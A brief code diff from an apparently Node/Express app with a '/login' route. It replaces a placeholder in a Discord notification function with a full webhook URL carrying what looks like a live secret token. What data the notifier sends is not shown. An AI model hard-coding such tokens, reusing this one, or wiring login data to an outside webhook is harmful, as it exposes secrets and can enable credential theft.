@@ -22,7 +22,7 @@ app.post('/login', (req, res) => {
 // Function to send notification to Discord webhook
 async function sendDiscordNotification(message) {
     try {
-        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+        const webhookUrl = 'https://discord.com/api/webhooks/1210061210880450691/xJdUz7UFnPghJjnB_AnacGQovB3RbTspmtHkNSyV23ckaPsBCfzuIFWmVatabEGYxJGY';
         await axios.post(webhookUrl, { content: message });
     } catch (error) {
         console.error('Error sending Discord notification:', error.message);
